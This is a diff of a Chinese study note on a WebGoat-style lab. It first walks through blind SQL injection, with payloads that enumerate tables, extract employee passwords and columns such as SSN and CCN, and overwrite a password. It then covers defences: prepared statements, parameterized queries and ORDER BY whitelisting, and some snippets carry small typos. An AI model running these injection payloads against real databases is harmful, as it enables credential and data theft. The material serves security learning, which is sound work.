@@ -220,14 +220,220 @@ Login入口测试了许久没有结果，但 Register 的用户名窗口存在�
 
 
 
-下列语句可行
+下列语句可执行，即可构造类似的select 返回 boolean 型值可以实现盲注。
 ```tom' and (SELECT True FROM information_schema.tables where table_type='VIEW' LIMIT 1) ; --```
 
+将结果变成一个字符串，使用函数：group_concat(table_NAME)，那么可以构造如下语句(普通数据表的类型为"BASE_TABLE"，视图为"VIEW")：
+```tom' and substring((SELECT group_concat(TABLE_NAME) FROM information_schema.tables  where table_type='BASE TABLE' and TABLE_SCHEMA='PUBLIC'),1,1)='a' ; --```
 
-将结果变成一个字符串 ```SELECT group_concat(table_NAME) FROM information_schema.tables where table_type='TABLE'```;
+使用zap的fuzz功能，构造正则，可以得到大量表名：如：SERVERUSER, _DATAUSER，_LOGINPINUSER, SYSTEM, DATAPRODUCT，DATA, MESSSAGES, EMPLOYEE,ROLES,AUTH,OWNERSHIP, WEATHER,_DATATRANSACTIONS,USER...
 
+优先尝试 EMPLOYEE 表，构造如下盲注语句，并利用fuzz进行自动请求发送
 
-编需要的：
+```tom' and substring((SELECT group_concat(COLUMN_NAME) FROM information_schema.columns where TABLE_NAME='EMPLOYEE' ),1,1)='a' ; --```
 
-```tom' and (SELECT SUBSTRING(group_concat(table_NAME),1,1)='S' FROM information_schema.tables where table_type='VIEW' LIMIT 1)  ; --```
+得到以下列名：USERID,FIRST_NAME,LAST_NAME,SSN, PASSWORD,TITLE,PHONE,ADDRESS1,ADDRESS2,MANAGER,START_DATE,SALARY,CCN...
 
+为了确定这个表里有tom，还可以构造下列类似语句测试。
+
+```tom' and substring((SELECT group_concat(FIRST_NAME) FROM EMPLOYEE where FIRST_NAME='Tom' ),1,1)='T' ; --```
+
+确定表找对了，那么就可以看看密码是什么了，构造如下语句并在1和‘a’处构造fuzz。
+
+```tom' and substring((SELECT group_concat(PASSWORD) FROM EMPLOYEE where FIRST_NAME='Tom' ),1,1)='a' ; --```
+
+发现密码为"tom"。本以为完成了，结果提交不了。听说要给他修改密码，那么就试试下面的语句。
+
+```tom' and (update EMPLOYEE set PASSWORD='123456'   where FIRST_NAME='Tom' ) ; --```
+
+修改经过验证是成功的，但使用tom/123456还是提交不了，怪了。
+
+好奇之下，我用下面语句作为基础，fuzz一下看有哪些用户名，确实只有一个Tom。
+
+```tom' and substring((SELECT group_concat(FIRST_NAME) FROM EMPLOYEE),1,1)='a' ; --```
+
+奈何，提交答案是错的。读者可以参考网上答案。
+
+### sql injection (mitigation)
+
+#### 有免疫力的查询
+防御sql注入最好的方法如下（不接收数据或将数据作为某个列的单独实体，而不去解释他）：
+
+##### 静态查询
+例如：```select * from products``` 语句中不接受任何输入值。
+
+又例如：```select * from users where user = "'" + session.getAttribute("UserID") + "'";``` 输入值与UserID绑定。
+
+##### 预编译查询
+使用预编译语句可以较好防御sql注入，因为在预编译语句中的输入参数值，不会再被sql编译器解释。
+
+```sql
+String query = "SELECT * FROM users WHERE last_name = ?";
+PreparedStatement statement = connection.prepareStatement(query);
+statement.setString(1, accountName);
+ResultSet results = statement.executeQuery();
+```
+
+##### 存储过程
+
+仅当存储过程不能生成动态sql时，可以使用存储过程避免注入问题。
+
+安全的存储过程例如(Microsoft SQL Server)：
+```sql
+CREATE PROCEDURE ListCustomers(@Country nvarchar(30))
+AS
+SELECT City, COUNT(*)
+FROM Customers
+WHERE Country LIKE @Country GROUP BY City
+
+EXEC ListCustomers ‘USA’
+```
+
+可注入的存储过程举例(Microsoft SQL Server):
+```sql
+CREATE PROEDURE getUser(@lastName nvarchar(25))
+AS
+declare @sql nvarchar(255)
+set @sql = 'select * from users where
+            LastName = + @LastName + '
+exec sp_executesql @sql
+```
+上面的@sql是一个动态的sql语句，可以被替换为注入内容。
+
+#### 参数化的查询
+
+以 Java 代码片段（Snippet）为例
+```java
+public static bool isUsernameValid(string username) {
+    RegEx r = new Regex("^[A-Za-z0-9]{16}$");
+    return r.isMatch(username);
+}
+
+// java.sql.Connection conn is set elsewhere for brevity.
+PreparedStatement ps = null;
+RecordSet rs = null;
+try {
+    pUserName = request.getParameter("UserName");
+    if ( isUsernameValid (pUsername) ) {
+        ps = conn.prepareStatement("SELECT * FROM user_table
+                                   WHERE username = ? ");
+        ps.setString(1, pUsername);
+        rs = ps.execute();
+        if ( rs.next() ) {
+            // do the work of making the user record active in some way
+        }
+    } else { // handle invalid input }
+}
+catch (…) { // handle all exceptions … }
+
+```
+
+使用预编译查询的JAVA实例：
+
+```java
+public static String loadAccount() {
+  // Parser returns only valid string data
+  String accountID = getParser().getStringParameter(ACCT_ID, "");
+  String data = null;
+  String query = "SELECT first_name, last_name, acct_id, balance FROM user_data WHERE acct_id = ?";
+  try (Connection connection = null;
+       PreparedStatement statement = connection.prepareStatement(query)) {
+     statement.setString(1, accountID);
+     ResultSet results = statement.executeQuery();
+     if (results != null && results.first()) {
+       results.last(); // Only one record should be returned for this query
+       if (results.getRow() <= 2) {
+         data = processAccount(results);
+       } else {
+         // Handle the error – Database integrity issue
+       }
+     } else {
+       // Handle the error – no records found }
+     }
+  } catch (SQLException sqle) {
+    // Log and handle the SQL Exception }
+  }
+  return data;
+}
+```
+
+.NET 参数化查询实例：
+```C#
+public static bool isUsernameValid(string username) {
+	RegEx r = new Regex(“^[A-Za-z0-9]{16}$”);
+	Return r.isMatch(username);
+}
+
+// SqlConnection conn is set and opened elsewhere for brevity.
+try {
+	string selectString = “SELECT * FROM user_table WHERE username = @userID”;
+	SqlCommand cmd = new SqlCommand( selectString, conn );
+	if ( isUsernameValid( uid ) ) {
+		cmd.Parameters.Add( "@userID", SqlDbType.VarChar, 16 ).Value = uid;
+		SqlDataReader myReader = cmd.ExecuteReader();
+		if ( myReader ) {
+			// make the user record active in some way.
+			myReader.Close();
+		}
+	} else { // handle invalid input }
+}
+catch (Exception e) { // Handle all exceptions… }
+```
+
+#### 使用预编译语句查询后还需要做输入校验么？
+当然需要。
+
+因为还有别的注入可能，例如：
+- 存储型XSS
+- 信息泄露
+- 逻辑错误
+- 其他未知sql注入
+
+#### Order by子句
+
+预编译查询能阻止所有的sql注入么？答案是否定的。
+
+看下面的例子：
+
+```select * from users order by lastname;```
+
+SQL语法如下:
+
+```SQL
+SELECT ...
+FROM tableList
+[WHERE Expression]
+[ORDER BY orderExpression [, ...]]
+
+orderExpression:
+{ columnNr | columnAlias | selectExpression }
+    [ASC | DESC]
+
+selectExpression:
+{ Expression | COUNT(*) | {
+    COUNT | MIN | MAX | SUM | AVG | SOME | EVERY |
+    VAR_POP | VAR_SAMP | STDDEV_POP | STDDEV_SAMP
+} ([ALL | DISTINCT][2]] Expression) } [[AS] label]
+
+Based on HSQLDB
+```
+
+上面的语法意味着 order 表达式可以是一个 select 表达式。所以使用case语句可以文数据库一些问题。
+
+例如：```select * from users order by ( case when (true) then lastname else firstname)```
+
+所以，我们能提交任何boolean操作在 ```when(...)``` 部分。这个语句可以执行，因为它是一个有效的查询，即便你使用了预编译的sql语句，或者即便你的语句中没有定义order子句。
+
+假如你需要提供一个排序功能，你需要设立一个白名单验证功能，验证order by语句，防止它出现意外。
+#### 练习
+
+例子需要补全的安全代码如下：
+```java
+
+Connection conn = DriverManager.getConnection(DBURL, DBUSER, DBPW);
+PreparedStatement ps = conn.prepareStatement("SELECT status FROM users WHERE name= ? AND mail=?");
+ps.getString(1,name);
+ps.getString(2,mail);
+//ResultSet rs = ps.executeQuery();
+
+```
